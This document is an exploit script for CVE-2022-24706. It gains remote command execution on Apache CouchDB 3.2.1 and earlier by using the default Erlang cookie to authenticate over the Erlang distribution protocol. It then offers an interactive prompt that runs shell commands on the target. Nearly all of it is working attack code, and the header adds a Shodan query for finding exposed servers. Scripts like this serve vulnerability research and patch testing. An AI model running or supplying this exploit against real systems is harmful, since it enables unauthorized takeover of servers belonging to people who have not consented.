# Exploit Title: CouchDB RCE via Erlang Distribution Protocol 
# Date: 2022-01-21
# Exploit Author: Konstantin Burov, @_sadshade
# Software Link: https://couchdb.apache.org/
# Version: 3.2.1 and below
# Tested on: Kali 2021.2
# Based on 1F98D's Erlang Cookie - Remote Code Execution
# Shodan: port:4369 "name couchdb at"
# CVE: CVE-2022-24706
# References:
#  https://habr.com/ru/post/661195/
#  https://www.exploit-db.com/exploits/49418
#  https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/
#  https://book.hacktricks.xyz/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd#erlang-cookie-rce
# 
#
#!/usr/local/bin/python3

import socket
from hashlib import md5
import struct
import sys
import re
import time

TARGET = ""
EPMD_PORT = 4369  # Default Erlang distributed port
COOKIE = "lrx8Qls22RZamFjvaJb+y2i1mXKuHxOGQ8teA"  # Default Erlang cookie for CouchDB 
ERLNAG_PORT = 23705
EPM_NAME_CMD = b"\x00\x01\x6e"  # Request for nodes list

NAME_MSG  = b"\x00\x1d\x4e\x00\x00\x00\x0d\x07\xdf\x7f\xbd\x65\x6a\x43\xc5\x00\x0e\x41\x41\x41\x41\x41\x41\x40\x41\x41\x41\x41\x41\x41\x41"

CHALLENGE_REPLY = b"\x00\x15\x72\xA3\x13\x5f\x1b"
CTRL_DATA  = b"\x83h\x04a\x06gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03"
CTRL_DATA += b"\x00\x00\x00\x00\x00w\x00w\x03rex"


def compile_cmd(CMD):
    MSG  = b"\x83h\x02gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03\x00\x00\x00"
    MSG += b"\x00\x00h\x05w\x04callw\x02osw\x03cmdl\x00\x00\x00\x01k"
    MSG += struct.pack(">H", len(CMD))
    MSG += bytes(CMD, 'ascii')
    MSG += b'jw\x04user'
    PAYLOAD = b'\x70' + CTRL_DATA + MSG
    PAYLOAD = struct.pack('!I', len(PAYLOAD)) + PAYLOAD
    return PAYLOAD

print("Remote Command Execution via Erlang Distribution Protocol.\n")

#while not TARGET:
#    TARGET = input("Enter target host:\n> ")

TARGET = "192.168.233.1"

# Connect to EPMD:
#try:
#    epm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#    epm_socket.connect((TARGET, EPMD_PORT))
#except socket.error as msg:
#    print("Couldnt connect to EPMD: %s\n terminating program" % msg)
#    sys.exit(1)
#    
#epm_socket.send(EPM_NAME_CMD) #request Erlang nodes
#if epm_socket.recv(4) == b'\x00\x00\x11\x11': # OK
#    data = epm_socket.recv(1024)
#    data = data[0:len(data) - 1].decode('ascii')
#    data = data.split("\n")
#    if len(data) == 1:
#        choise = 1
#        print("Found " + data[0])
#    else:
#        print("\nMore than one node found, choose which one to use:")
#        line_number = 0
#        for line in data:
#            line_number += 1
#            print(" %d) %s" %(line_number, line))
#        choise = int(input("\n> "))
#        
#    ERLNAG_PORT = int(re.search("\d+$",data[choise - 1])[0])
#else:
#    print("Node list request error, exiting")
#    sys.exit(1)
#epm_socket.close()

# Connect to Erlang port:
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET, ERLNAG_PORT))
except socket.error as msg:
    print("Couldnt connect to Erlang server: %s\n terminating program" % msg)
    sys.exit(1)
   
s.send(NAME_MSG)
s.recv(5)                    # Receive "ok" message
challenge = s.recv(1024)     # Receive "challenge" message
challenge = struct.unpack(">I", challenge[11:15])[0]

print("Extracted challenge: {}".format(challenge))

# Add Challenge Digest
CHALLENGE_REPLY += md5(bytes(COOKIE, "ascii")
    + bytes(str(challenge), "ascii")).digest()
s.send(CHALLENGE_REPLY)

print("CHALLENGE_REPLY: {}".format(CHALLENGE_REPLY))
CHALLENGE_RESPONSE = s.recv(19)
print("CHALLENGE_RESPONSE: {}".format(CHALLENGE_RESPONSE))
if len(CHALLENGE_RESPONSE) == 0:
    print("Authentication failed, exiting")
    sys.exit(1)
    
s.recv(4000)


print("Authentication successful")
print("Enter command:\n")

data_size = 0
while True:
    if data_size <= 0:
        CMD = input("> ")
        if not CMD:
            continue
        elif CMD == "exit":
            sys.exit(0)
        s.send(compile_cmd(CMD))
        data_size = struct.unpack(">I", s.recv(4))[0] # Get data size
        s.recv(45)              # Control message
        data_size -= 45         # Data size without control message
        time.sleep(0.1)
    elif data_size < 1024:        
        data = s.recv(data_size)
        print(data)
        #print("S---data_size: %d, data_recv_size: %d" %(data_size,len(data)))
        time.sleep(0.1)
        print(data.decode())
        data_size = 0
    else:        
        data = s.recv(1024)
        print(data)
        #print("L---data_size: %d, data_recv_size: %d" %(data_size,len(data)))
        time.sleep(0.1)
        print(data.decode(),end = '')
        data_size -= 1024
        
    
            